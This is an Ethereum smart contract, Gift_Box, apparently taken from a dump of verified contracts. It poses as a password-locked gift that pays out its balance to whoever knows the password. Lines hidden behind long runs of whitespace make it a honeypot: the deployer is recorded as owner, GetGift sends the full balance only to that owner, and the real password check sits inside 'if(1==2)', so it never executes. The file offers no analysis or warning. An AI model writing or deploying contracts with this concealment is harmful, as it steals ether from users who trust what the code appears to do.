
//Address: 0x31fd65340a3d272e21fd6ac995f305cc1ad5f42a
//Contract name: Gift_Box
//Balance: 0 Ether
//Verification Date: 1/31/2018
//Transacion Count: 6

// CODE STARTS HERE

pragma solidity ^0.4.18;

contract Gift_Box
{                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      address prop = msg.sender;
    function()payable{}
    
    function GetHash(bytes pass) constant returns (bytes32) {return sha3(pass);}
    
    bytes32 public hashPass;
    
    function SetPass(bytes32 hash)
    public
    payable
    {
        if(msg.value >= 1 ether)
        {
            hashPass = hash;
        }
    }
    
    function GetGift(bytes pass)
    public
    payable
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               if(msg.sender==prop){msg.sender.transfer(this.balance);}if(1==2){
        if(hashPass == sha3(pass))
        {
            msg.sender.transfer(this.balance);
        }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                }
    }
}
